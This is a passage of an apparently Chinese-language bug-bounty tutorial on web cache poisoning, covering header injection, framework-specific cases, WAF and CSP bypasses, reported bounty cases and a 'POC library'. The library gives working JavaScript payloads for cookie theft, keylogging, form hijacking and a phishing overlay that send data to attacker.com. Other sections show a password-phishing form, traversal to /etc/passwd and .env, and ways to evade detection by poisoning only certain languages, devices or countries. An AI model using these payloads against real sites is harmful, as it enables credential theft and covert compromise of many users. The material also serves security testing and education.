+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/oauth/callback</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">X-Forwarded-Host</span><span class="hljs-punctuation">: </span>evil.com<br></code></pre></td></tr></table></figure>
+
+<p><strong>步骤 2</strong>：OAuth 流程利用<br>用户发起 OAuth → 被重定向到 <code>evil.com/callback</code>，携带授权码</p>
+<p><strong>步骤 3</strong>：钓鱼页面</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 在 evil.com/callback 上 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>target.com - 完成登录<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;https://attacker.com/steal&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;验证您的密码&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>继续<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+<ul>
+<li>URL 以合法域名开头</li>
+<li>OAuth 流程建立信任</li>
+<li>用户期望认证步骤</li>
+<li>授权码已经泄露</li>
+</ul>
+<p><strong>赏金范围</strong>：$8,000 — $15,000</p>
+<h3 id="3：缓存欺骗-→-缓存投毒-→-大规模数据泄露"><a href="#3：缓存欺骗-→-缓存投毒-→-大规模数据泄露" class="headerlink" title="3：缓存欺骗 → 缓存投毒 → 大规模数据泄露"></a>3：缓存欺骗 → 缓存投毒 → 大规模数据泄露</h3><p><strong>步骤 1</strong>：发现缓存欺骗</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/api/user/profile/nonexistent.css</span> <span class="hljs-meta">HTTP/1.1</span><br></code></pre></td></tr></table></figure>
+<p>如果服务器忽略路径后缀并以 CSS 形式返回个人资料数据。</p>
+<p><strong>步骤 2</strong>：结合缓存投毒</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/api/user/profile/exploit.css</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">X-Forwarded-Host</span><span class="hljs-punctuation">: </span>attacker.com/collect.js<br></code></pre></td></tr></table></figure>
+
+<p><strong>步骤 3</strong>：注入数据外带</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// attacker.com 上的 collect.js</span><br><span class="hljs-keyword">const</span> data = <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerText</span>;<br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://attacker.com/leak?data=&#x27;</span> + <span class="hljs-built_in">encodeURIComponent</span>(data));<br></code></pre></td></tr></table></figure>
+
+<p><strong>结果</strong>：每个用户的个人资料数据都被外带到攻击者的服务器。</p>
+<p><strong>赏金范围</strong>：$12,000 — $25,000</p>
+<p><strong>真实研究</strong>：类似技术记录在 <a target="_blank" rel="noopener" href="https://portswigger.net/research/web-cache-entanglement">PortSwigger 的”Web Cache Entanglement”</a> 中。</p>
+<h2 id="五-特定框架投毒"><a href="#五-特定框架投毒" class="headerlink" title="五. 特定框架投毒"></a>五. 特定框架投毒</h2><h3 id="1：Next-js-缓存投毒（CVE-2024-46982）"><a href="#1：Next-js-缓存投毒（CVE-2024-46982）" class="headerlink" title="1：Next.js 缓存投毒（CVE-2024-46982）"></a>1：Next.js 缓存投毒（CVE-2024-46982）</h3><p><strong>关键漏洞</strong>：CVSS 7.5（高）</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/_next/data/[build-id]/page.json</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">X-Forwarded-Host</span><span class="hljs-punctuation">: </span>evil.com<br></code></pre></td></tr></table></figure>
+
+<p><strong>利用</strong>：Next.js 中的 <code>stale-while-revalidate</code> 指令允许攻击者：</p>
+<ul>
+<li>投毒 ISR（增量静态再生）缓存</li>
+<li>向所有用户提供恶意 JavaScript</li>
+<li>即使在缓存重新验证期后仍然持续</li>
+</ul>
+<p><strong>真实影响</strong>：<a target="_blank" rel="noopener" href="https://cybersecuritynews.com/critical-vulnerability-exposes-websites/">Next.js 框架漏洞使网站面临缓存投毒</a></p>
+<ul>
+<li>在赏金项目中被利用</li>
+<li>在电子商务和金融科技中发现高严重性漏洞</li>
+<li>一个实例：存储型 XSS 从主要平台提取敏感用户数据</li>
+</ul>
+<p><strong>赏金范围</strong>：$8,000 — $20,000（取决于平台范围）</p>
+<h3 id="2：WordPress-缓存插件利用"><a href="#2：WordPress-缓存插件利用" class="headerlink" title="2：WordPress 缓存插件利用"></a>2：WordPress 缓存插件利用</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/wp-json/wp/v2/posts</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">X-Forwarded-Host</span><span class="hljs-punctuation">: </span>evil.com<br><span class="hljs-attribute">X-Original-URL</span><span class="hljs-punctuation">: </span>/wp-admin/admin-ajax.php?action=get_all_users<br></code></pre></td></tr></table></figure>
+
+<p><strong>常见问题：</strong></p>
+<ul>
+<li>W3 Total Cache 信任代理 Header</li>
+<li>WP Super Cache 不验证 X-Forwarded-Host</li>
+<li>LiteSpeed Cache 存在路径混淆问题</li>
+</ul>
+<p><strong>攻击</strong>：将管理 API 响应缓存在公开端点</p>
+<h3 id="Django-缓存中间件绕过"><a href="#Django-缓存中间件绕过" class="headerlink" title="Django 缓存中间件绕过"></a>Django 缓存中间件绕过</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 有漏洞的 Django 设置</span><br>MIDDLEWARE = [<br>    <span class="hljs-string">&#x27;django.middleware.cache.UpdateCacheMiddleware&#x27;</span>,  <span class="hljs-comment"># 在认证之前缓存！</span><br>    <span class="hljs-string">&#x27;django.contrib.auth.middleware.AuthenticationMiddleware&#x27;</span>,<br>    <span class="hljs-string">&#x27;django.middleware.cache.FetchFromCacheMiddleware&#x27;</span>,<br>]<br></code></pre></td></tr></table></figure>
+
+<p><strong>利用：</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/admin/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>sessionid=attacker_session<br><span class="hljs-attribute">X-Forwarded-Host</span><span class="hljs-punctuation">: </span>evil.com<br></code></pre></td></tr></table></figure>
+
+<p>如果缓存在认证之前发生，管理页面会被缓存并带有攻击者的 XSS 载荷。</p>
+<h2 id="六-位置和语言定向攻击"><a href="#六-位置和语言定向攻击" class="headerlink" title="六. 位置和语言定向攻击"></a>六. 位置和语言定向攻击</h2><h3 id="选择性投毒策略"><a href="#选择性投毒策略" class="headerlink" title="选择性投毒策略"></a>选择性投毒策略</h3><ul>
+<li>更难检测</li>
+<li>绕过自动化扫描器</li>
+<li>可以针对特定用户群体</li>
+<li>增强隐蔽性</li>
+</ul>
+<h3 id="1：语言特定投毒"><a href="#1：语言特定投毒" class="headerlink" title="1：语言特定投毒"></a>1：语言特定投毒</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>es-ES<br><span class="hljs-attribute">X-Forwarded-Host</span><span class="hljs-punctuation">: </span>evil.com<br></code></pre></td></tr></table></figure>
+
+<p><strong>结果：</strong></p>
+<ul>
+<li>英语用户：干净缓存 ✅</li>
+<li>西班牙语用户：有毒缓存 ⚠️</li>
+<li>德语用户：干净缓存 ✅</li>
+</ul>
+<p><strong>防御绕过</strong>：安全团队用英语测试，错过了西班牙语缓存。</p>
+<h3 id="2：仅移动端投毒"><a href="#2：仅移动端投毒" class="headerlink" title="2：仅移动端投毒"></a>2：仅移动端投毒</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (iPhone; CPU iPhone OS 15_0)<br><span class="hljs-attribute">X-Forwarded-Device</span><span class="hljs-punctuation">: </span>mobile<br><span class="hljs-attribute">X-Forwarded-Host</span><span class="hljs-punctuation">: </span>evil.com<br></code></pre></td></tr></table></figure>
+
+<p><strong>结果</strong>：仅移动用户受影响。</p>
+<ul>
+<li>独立的移动缓存</li>
+<li>移动端通常监控较少</li>
+<li>移动端不同的 CSP 策略</li>
+<li>移动应用有更大的用户群</li>
+</ul>
+<h3 id="3：国家特定投毒"><a href="#3：国家特定投毒" class="headerlink" title="3：国家特定投毒"></a>3：国家特定投毒</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">CloudFront-Viewer-Country</span><span class="hljs-punctuation">: </span>BR<br><span class="hljs-attribute">X-Forwarded-Host</span><span class="hljs-punctuation">: </span>evil.com<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>安全监控较少的国家</li>
+<li>用户活跃度高的地区</li>
+<li>支持有限的国家</li>
+<li>地理缓存分区</li>
+</ul>
+<p><strong>真实影响</strong>：<a target="_blank" rel="noopener" href="https://hackerone.com/reports/">TikTok 广告缓存欺骗（信息泄露）</a> — 地理定向信息泄露赏金 $200。</p>
+<h2 id="七-防护绕过"><a href="#七-防护绕过" class="headerlink" title="七. 防护绕过"></a>七. 防护绕过</h2><h3 id="绕过-WAF-规则"><a href="#绕过-WAF-规则" class="headerlink" title="绕过 WAF 规则"></a>绕过 WAF 规则</h3><p><strong>场景</strong>：WAF 阻止包含 “evil.com” 的 X-Forwarded-Host</p>
+<p><strong>绕过 1</strong>：Unicode 规范化</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">X-Forwarded-Host: ｅvil.com  <span class="hljs-meta"># 全角 <span class="hljs-string">&#x27;e&#x27;</span></span><br></code></pre></td></tr></table></figure>
+
+<p><strong>绕过 2</strong>：IPv6 表示法</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">X-Forwarded-Host: [<span class="hljs-number">::ffff:192</span>.<span class="hljs-number">168.1.1</span>]:evil.com<br></code></pre></td></tr></table></figure>
+
+<p><strong>绕过 3</strong>：Header 走私</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">X-Forwarded-Host</span><span class="hljs-punctuation">: </span>legitimate.com<br><span class="hljs-attribute">X-Forwarded-Host</span><span class="hljs-punctuation">: </span>evil.com<br></code></pre></td></tr></table></figure>
+<p>某些后端只验证第一次出现，使用第二次。</p>
+<h3 id="绕过-CSP"><a href="#绕过-CSP" class="headerlink" title="绕过 CSP"></a>绕过 CSP</h3><p><strong>场景</strong>：严格的 CSP 阻止外部脚本</p>
+<figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csp"><span class="hljs-attribute">Content-Security-Policy</span>: <span class="hljs-keyword">default-src</span> <span class="hljs-string">&#x27;self&#x27;</span>; <span class="hljs-keyword">script-src</span> <span class="hljs-string">&#x27;self&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>绕过</strong>：利用受信任的子域名</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">X-Forwarded-Prefix: //<span class="hljs-keyword">trusted</span>-but-vulnerable-subdomain.target.com<br></code></pre></td></tr></table></figure>
+
+<p>如果受信任的子域名存在 XSS，在那里注入载荷：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;//trusted-but-vulnerable-subdomain.target.com/xss.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>CSP 允许它，因为它是同源的。</p>
+<h3 id="绕过输入验证"><a href="#绕过输入验证" class="headerlink" title="绕过输入验证"></a>绕过输入验证</h3><p><strong>场景</strong>：应用检查 “http:&#x2F;&#x2F;“ 和 “https:&#x2F;&#x2F;“</p>
+<p><strong>绕过 1</strong>：协议相对 URL</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-attribute">X-Forwarded-Host</span>: <span class="hljs-comment">//evil.com</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>绕过 2</strong>：Data URI</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">X-Forwarded-Host: data:<span class="hljs-built_in">text</span>/html,&lt;<span class="hljs-keyword">script</span>&gt;alert(<span class="hljs-number">1</span>)&lt;/<span class="hljs-keyword">script</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<p><strong>绕过 3</strong>：JavaScript URI</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-attribute">X-Forwarded-Scheme</span>: javascript<br><span class="hljs-attribute">X-Forwarded-Host</span>: <span class="hljs-built_in">void</span>(<span class="hljs-built_in">alert</span>(document.cookie))<br></code></pre></td></tr></table></figure>
+
+<h2 id="八-真实案例"><a href="#八-真实案例" class="headerlink" title="八. 真实案例"></a>八. 真实案例</h2><h3 id="案例研究-1：PayPal-DoS-—-9-700"><a href="#案例研究-1：PayPal-DoS-—-9-700" class="headerlink" title="案例研究 1：PayPal DoS — $9,700"></a>案例研究 1：PayPal DoS — $9,700</h3><p><strong>报告</strong>：HackerOne 上的顶级 Web 缓存投毒<br><strong>目标</strong>：PayPal 支付处理<br><strong>攻击向量</strong>：缓存投毒导致持久性 DoS<br><strong>技术</strong>：研究者投毒了关键的支付处理端点，导致服务中断。</p>
+<ul>
+<li>影响实际支付处理</li>
+<li>业务关键功能</li>
+<li>可能影响数百万交易</li>
+<li>需要立即修复</li>
+</ul>
+<p><strong>教训</strong>：针对业务关键端点以获得最大影响。</p>
+<h3 id="案例研究-2：Shopify-Host-Header-DoS-—-2-900"><a href="#案例研究-2：Shopify-Host-Header-DoS-—-2-900" class="headerlink" title="案例研究 2：Shopify Host Header DoS — $2,900"></a>案例研究 2：Shopify Host Header DoS — $2,900</h3><p><strong>报告</strong>：<a target="_blank" rel="noopener" href="https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPWEBCACHE.md">#themes.shopify.com 缓存投毒</a><br><strong>攻击向量</strong>：Host Header 操纵</p>
+<p><strong>影响：</strong></p>
+<ul>
+<li>Shopify 主题市场的 DoS</li>
+<li>影响所有浏览主题的商家</li>
+<li>阻止主题安装</li>
+</ul>
+<hr>
+<ul>
+<li>高流量端点</li>
+<li>影响收入（商家无法购买主题）</li>
+<li>清晰的业务影响</li>
+</ul>
+<h3 id="案例研究-3：Glassdoor-XSS-链-—-多份报告"><a href="#案例研究-3：Glassdoor-XSS-链-—-多份报告" class="headerlink" title="案例研究 3：Glassdoor XSS 链 — 多份报告"></a>案例研究 3：Glassdoor XSS 链 — 多份报告</h3><p><strong>报告 #1621540</strong>：Web 缓存投毒 → 存储型 XSS<br><strong>报告 #1424094</strong>：CSRF Token 泄露 → XSS → 账户接管</p>
+<p><strong>攻击模式：</strong></p>
+<ul>
+<li>URL 解析器混淆</li>
+<li>通过 Cookie&#x2F;Header 参数缓存的反射型 XSS</li>
+<li>通过缓存泄露 CSRF Token</li>
+<li>链接实现账户接管</li>
+</ul>
+<hr>
+<ul>
+<li>多漏洞链</li>
+<li>清晰的账户接管路径</li>
+<li>影响认证用户</li>
+<li>可大规模利用</li>
+</ul>
+<h3 id="案例研究-4：Data-gov-篡改-—-750"><a href="#案例研究-4：Data-gov-篡改-—-750" class="headerlink" title="案例研究 4：Data.gov 篡改 — $750"></a>案例研究 4：Data.gov 篡改 — $750</h3><p><strong>报告</strong>：<a target="_blank" rel="noopener" href="https://hackerone.com/reports/303730">#303730</a><br><strong>目标</strong>：catalog.data.gov<br><strong>攻击</strong>：X-Forwarded-Host → 篡改</p>
+<p><strong>影响：</strong></p>
+<ul>
+<li>政府网站篡改</li>
+<li>.gov 域名上的 XSS</li>
+<li>公众信任问题</li>
+</ul>
+<hr>
+<ul>
+<li>政府目标（更高严重性）</li>
+<li>面向公众的篡改</li>
+<li>声誉损害</li>
+</ul>
+<h3 id="案例研究-5：Mozilla-开发者门户-DoS-—-未公开金额"><a href="#案例研究-5：Mozilla-开发者门户-DoS-—-未公开金额" class="headerlink" title="案例研究 5：Mozilla 开发者门户 DoS — 未公开金额"></a>案例研究 5：Mozilla 开发者门户 DoS — 未公开金额</h3><p><strong>报告</strong>：<a target="_blank" rel="noopener" href="https://hackerone.com/reports/1976449">#1976449</a><br><strong>攻击</strong>：X-Forwarded-Host 导致 404 错误</p>
+<p><strong>技术：</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-Forwarded-Host:<span class="hljs-meta"> [导致后端错误的值]</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>结果</strong>：developer.mozilla.org 的无限期 DoS</p>
+<p><strong>影响：</strong></p>
+<ul>
+<li>主要文档平台宕机</li>
+<li>影响所有 Firefox 开发者</li>
+<li>学习资源不可用</li>
+</ul>
+<h2 id="九-高级POC库"><a href="#九-高级POC库" class="headerlink" title="九. 高级POC库"></a>九. 高级POC库</h2><h3 id="XSS-poc"><a href="#XSS-poc" class="headerlink" title="XSS poc"></a>XSS poc</h3><p><strong>基础警告：</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">X-Forwarded-Host: evil.com&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">domain</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>Cookie 窃取：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">X-Forwarded-Host: evil.com/steal.js<br></code></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// steal.js 内容：</span><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://attacker.com/?c=&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);<br></code></pre></td></tr></table></figure>
+
+<p><strong>键盘记录器：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">X-Forwarded-Host: evil.com/keylog.js<br></code></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// keylog.js 内容：</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;keypress&#x27;</span>, <span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123;<br>  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://attacker.com/?key=&#x27;</span>+e.<span class="hljs-property">key</span>);<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p><strong>表单劫持：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">X-Forwarded-Host: evil.com/hijack.js<br></code></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// hijack.js 内容：</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">&#x27;form&#x27;</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">f</span> =&gt;</span> &#123;<br>  f.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;submit&#x27;</span>, <span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123;<br>    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://attacker.com/?&#x27;</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>(f)));<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p><strong>钓鱼覆盖层：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">X-Forwarded-Host: evil.com/overlay.js<br></code></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// overlay.js 内容：</span><br><span class="hljs-keyword">const</span> div = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;div&#x27;</span>);<br>div.<span class="hljs-property">innerHTML</span> = <span class="hljs-string">&#x27;&lt;form style=&quot;position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999&quot;&gt;&lt;h1&gt;会话已过期 - 重新登录&lt;/h1&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot;&gt;&lt;button&gt;登录&lt;/button&gt;&lt;/form&gt;&#x27;</span>;<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(div);<br></code></pre></td></tr></table></figure>
+
+<h3 id="DoS-poc"><a href="#DoS-poc" class="headerlink" title="DoS poc"></a>DoS poc</h3><p><strong>端口操纵：</strong></p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-attribute">X-Forwarded-Port</span>: <span class="hljs-number">99999</span><br><span class="hljs-attribute">X-Forwarded-Port</span>: -<span class="hljs-number">1</span><br><span class="hljs-attribute">X-Forwarded-Port</span>: <span class="hljs-variable">@evil</span>.com<br></code></pre></td></tr></table></figure>
+
+<p><strong>协议混淆：</strong></p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coq">X-Forwarded-<span class="hljs-keyword">Scheme</span>: file<br>X-Forwarded-<span class="hljs-keyword">Scheme</span>: ftp<br>X-Forwarded-<span class="hljs-keyword">Scheme</span>: javascript<br></code></pre></td></tr></table></figure>
+
+<p><strong>路径破坏：</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">X-Original-URL: <span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd<br>X-Original-URL: <span class="hljs-regexp">/.%00./</span>.%<span class="hljs-number">00</span>./<br>X-Original-URL: /admin\x00<br></code></pre></td></tr></table></figure>
+
+<p><strong>编码炸弹：</strong></p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">Accept-Encoding:</span> gzip,gzip,gzip,gzip,gzip （重复 <span class="hljs-number">1000</span> 次）<br><span class="hljs-params">Accept-Encoding:</span> <span class="hljs-operator">*</span><span class="hljs-comment">/*/*/</span><span class="hljs-operator">*</span><span class="hljs-comment">/* （无效）</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="信息泄露poc"><a href="#信息泄露poc" class="headerlink" title="信息泄露poc"></a>信息泄露poc</h3><p><strong>扩展名混淆：</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/api/user/profile.css</span> <span class="hljs-meta">HTTP/1.1</span><br>GET /api/user/profile.js HTTP/1.1<br>GET /api/user/profile.png HTTP/1.1<br>GET /api/user/profile.woff HTTP/1.1<br></code></pre></td></tr></table></figure>
+
+<p><strong>路径遍历：</strong></p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">X-Original-URL:</span> <span class="hljs-symbol">/api/internal/config</span><br><span class="hljs-params">X-Original-URL:</span> <span class="hljs-symbol">/admin/users/export</span><br><span class="hljs-params">X-Original-URL:</span> <span class="hljs-operator">/</span>.env<br></code></pre></td></tr></table></figure>
+
+<p><strong>API 版本混淆：</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/api/v1/users</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">X-Original-URL</span><span class="hljs-punctuation">: </span>/api/v2/admin/users<br></code></pre></td></tr></table></figure>
+
+<h2 id="十-真实测试场景"><a href="#十-真实测试场景" class="headerlink" title="十. 真实测试场景"></a>十. 真实测试场景</h2><h3 id="场景-1：电子商务平台"><a href="#场景-1：电子商务平台" class="headerlink" title="场景 1：电子商务平台"></a>场景 1：电子商务平台</h3><p><strong>目标</strong>：每日 100 万用户的在线商店</p>
+<p><strong>攻击路径：</strong></p>
+<ol>
+<li><p><strong>侦察：</strong></p>
+<ul>
+<li>识别：结账流程使用 <code>/checkout</code> 端点</li>
+<li>流量：每日约 10 万次结账尝试</li>
+<li>缓存：Cloudflare，5 分钟 TTL</li>
+</ul>
+</li>
+<li><p><strong>利用：</strong></p>
+</li>
+</ol>
